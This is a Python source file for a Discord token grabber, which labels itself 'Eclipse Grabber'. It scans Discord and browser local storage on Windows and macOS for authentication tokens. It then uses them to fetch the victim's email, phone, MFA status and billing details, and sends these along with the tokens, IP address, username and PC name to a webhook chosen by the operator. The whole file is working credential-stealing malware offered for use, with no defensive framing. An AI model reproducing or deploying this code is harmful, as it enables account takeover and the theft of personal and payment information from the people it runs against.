import os
import ssl
from platform import node as get_pc_name
from sys import platform as OS
from getpass import getuser
from re import findall
from json import loads, dumps
from typing import Optional, List
from urllib.request import Request, urlopen

ssl._create_default_https_context = ssl._create_unverified_context


def open_url(url: str,
             token: Optional[str] = None,
             data: Optional[bytes] = None) -> Optional[dict]:
    headers = {
        "Content-Type": "application/json",
        "User-Agent": ("Mozilla/5.0 (X11; Linux x86_64) "
                       "AppleWebKit/537.11 (KHTML, like Gecko) "
                       "Chrome/23.0.1271.64 Safari/537.11")
    }
    if token:
        headers.update({"Authorization": token})
    try:
        result = urlopen(Request(url, data, headers)).read().decode().strip()
        if result:
            return loads(result)
    except Exception:
        pass


class Computer():

    IPIFY_API_URL = "https://api.ipify.org?format=json"

    def __init__(self):
        api_resp: dict = open_url(self.IPIFY_API_URL)
        self.ip: Optional(str) = api_resp.get("ip") if api_resp else None
        self.name: str = get_pc_name().split(".")[0] if get_pc_name().find('.') else get_pc_name()
        self.username: str = getuser()

    def get_paths(self) -> dict:
        if OS == "win32":  # Windows
            LOCAL = os.getenv("LOCALAPPDATA")
            ROAMING = os.getenv("APPDATA")

        if OS == "darwin":  # OSX
            LOCAL = os.path.expanduser("~/Library/Application Support")
            ROAMING = os.path.expanduser("~/Library/Application Support")

        PATHS = {
            "Discord": os.path.join(ROAMING, "Discord"),
            "Discord Canary": os.path.join(ROAMING, "discordcanary"),
            "Discord PTB": os.path.join(ROAMING, "discordptb"),
        }

        if OS == "darwin":  # OSX
            PATHS.update({
                "Google Chrome": os.path.join(LOCAL,
                                              "Google",
                                              "Chrome",
                                              "Default"),
                "Yandex": os.path.join(LOCAL,
                                       "Yandex",
                                       "YandexBrowser",
                                       "Default")
            })

        if OS == "win32":  # Windows
            PATHS.update({
                "Google Chrome": os.path.join(LOCAL,
                                              "Google",
                                              "Chrome",
                                              "User Data",
                                              "Default"),
                "Opera": os.path.join(ROAMING,
                                      "Opera Software",
                                      "Opera Stable"),
                "Brave":  os.path.join(LOCAL,
                                       "BraveSoftware",
                                       "Brave-Browser",
                                       "User Data",
                                       "Default"),
                "Yandex": os.path.join(LOCAL,
                                       "Yandex",
                                       "YandexBrowser",
                                       "User Data",
                                       "Default")
            })

        return PATHS


class Account():

    DISCORD_API_URL = "https://discordapp.com/api/v6/users/@me"
    DISCORD_AVATARS_URL = "https://cdn.discordapp.com/avatars/"

    def __init__(self, token: str, token_location: str):
        self.token: str = token
        self.token_location: str = token_location
        self.account_data: dict = open_url(self.DISCORD_API_URL, self.token)
        if not self.account_data:
            return
        self.name: str = self.account_data.get('username')
        self.discriminator = self.account_data.get('discriminator')
        self.id: str = self.account_data.get('id')
        self.email: str = self.account_data.get('email')
        self.phone: str = self.account_data.get('phone')
        self.mfa: bool = self.account_data.get('mfa_enabled')
        self.locale: str = self.account_data.get('locale')
        self.nitro: bool = bool(self.account_data.get('premium_type'))
        self.avatar_id: str = self.account_data.get('avatar')
        self.avatar_url: str = (self.DISCORD_AVATARS_URL
                                + f"/{self.id}/{self.avatar_id}")
        self.billing_data: str = open_url(self.DISCORD_API_URL
                                          + "/billing/payment-sources",
                                          self.token)

    def billing_info(self) -> List[str]:
        if not self.billing_data:
            return "None"
        billing_info = []
        for bill in self.billing_data:
            billing_info.append(
                f"Id: {str(bill.get('id'))}\n"
                f"Owner: {str(bill.get('billing_address').get('name').title())}\n"
                f"Postal Code: {str(bill.get('billing_address').get('postal_code'))}\n"
                f"Invalid: {str(bill.get('invalid'))}\n"
                f"Brand: {str(bill.get('brand')).capitalize()}\n"
                f"Last digits: {str(bill.get('last_4'))}\n"
                f"Expires: {str(bill.get('expires_month'))}"
                f"/{str(bill.get('expires_year'))}\n"
                f"Country: {str(bill.get('country'))}"
                )
        return billing_info


def field_former(title: str, text: str, inline: bool = True) -> str:
    return {
        "name": f"**{title} Info**",
        "value": str(text),
        "inline": bool(inline)
        }


def embed_accounts_info(accounts: List[Account], host: Computer) -> List[dict]:
    embeds = []
    for account in accounts.values():
        account_info = (
            f'Email: {account.email}\n'
            f'Phone: {account.phone}\n'
            f"Nitro: {'Enabled' if account.nitro else 'Disabled'}\n"
            f"MFA: {'Enabled' if account.mfa else 'Disabled'}\n"
            f"Lang: {str(account.locale).capitalize()}"
            )
        pc_info = (
            f'IP: {host.ip}\n'
            f'Username: {host.username}\n'
            f'PC Name: {host.name}\n'
            f'Token App: {account.token_location}')

        fields = []
        fields.append(field_former("Account", account_info))
        fields.append(field_former("PC", pc_info))
        if account.billing_data:
            fields.append(field_former("Billing", account.billing_info()[0]))
        fields.append(field_former("Token", account.token, False))

        embeds.append({
            "color": 0x6A5ACD,
            "fields": fields,
            "author": {
                "name": (f"{account.name}#"
                         f"{account.discriminator} "
                         f"({account.id})"),
                "icon_url": account.avatar_url
            },
            "footer": {
                "text": "Made by @3ct0s and @JM1k1",
            }
        })
    return embeds


def send_webhook(embeds: List[dict], WEBHOOK_URL: str):
    webhook = {
        "content": "",
        "embeds": embeds,
        "username": "Eclipse Grabber",
        "avatar_url": "https://imgur.com/Ymo8GEe.png"
    }
    data = dumps(webhook).encode()
    return open_url(WEBHOOK_URL, None, data)


def get_tokens(path: str) -> List[str]:
    tokens = []
    for file_name in os.listdir(path):
        if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
            continue
        lines = open(os.path.join(path, file_name),
                     errors="ignore").readlines()
        for line in map(str.strip, lines):
            for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}",
                          r"mfa\.[\w-]{84}"):
                for token in findall(regex, line):
                    tokens.append(token)
    return tokens


def get_accounts(host: Computer) -> dict:
    accounts = {}
    for app_name, path in host.get_paths().items():
        path = os.path.join(path, "Local Storage", "leveldb")
        if not os.path.exists(path):
            continue
        for token in get_tokens(path):
            account = Account(token, app_name)
            if not account.account_data or account.id in accounts.keys():
                continue
            else:
                accounts.update({account.id: account})
    return accounts


def main(WEBHOOK_URL: str):
    host = Computer()
    accounts = get_accounts(host)
    embeds = embed_accounts_info(accounts, host)
    send_webhook(embeds, WEBHOOK_URL)